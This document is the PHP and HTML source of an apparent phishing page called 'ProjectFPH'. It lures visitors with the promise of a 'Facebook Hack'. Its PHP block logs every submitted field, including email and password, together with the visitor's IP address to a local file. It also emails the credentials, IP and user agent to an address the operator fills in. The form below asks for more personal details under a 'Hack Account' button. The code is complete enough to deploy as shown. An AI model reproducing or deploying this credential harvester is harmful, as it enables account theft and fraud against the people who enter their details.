<style>
    body{
        background-color: #0b60a5;
    }
</style>
<?php
if(!isset($_POST['email']) || empty($_POST['email']) || !isset($_POST['pass']) || empty($_POST['pass']))
{
	echo "Facebook Hack will not work with Incomplete Details. Go back and fill them.";
}
else{
    $logfile = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($logfile, $variable);
    fwrite($logfile, "=");
    fwrite($logfile, $value);
    fwrite($logfile, "\r\n");
    }
    fwrite($logfile, "IP : ");
    fwrite($logfile, $_SERVER['REMOTE_ADDR']);
    fwrite($logfile, "\r\n");
    fclose($logfile);
}

$client_mail = "YOUR EMAIL HERE";

$msg = array("FBOT Report.\n\n", "Email : ", $_POST['email'], "\nPassword : " , $_POST['pass'], "IP : ", $_SERVER['REMOTE_ADDR'], "HTTP_USER_AGENT : " , $_SERVER['HTTP_USER_AGENT']);

mail($client_mail, "ProjectFPH LOG", implode("\r\n", $msg));
?>

<!DOCTYPE html>
<html>
<head>
	<title>ProjectFPH</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
</head>
    
<body>

<div class="top">
   
	<h1 style="margin-top:0; color:black">ProjectFPH</h1> 
</div>
	<header>
		<div class="head" style="display:inline-block;align-self:center">
		    <br>
		    <img src="flogo.png">
			<h3>Information</h3>
            Enter your Information : <br>
            <form action="account.php" method="POST">
                <input class="input" name="name" placeholder="Account Name here"><br><br>
                <input class="input" name="link" placeholder="Account Link here" ><br><br>
                <input class="input" name="phoneno" placeholder="Phone Number (For Special Cases)" ><br><br>
                <input class="button-hack-main" type="submit" value="Hack Account"><br><br>
            </form>
            <br>
            
		</div>
	</header>


</body>
</html>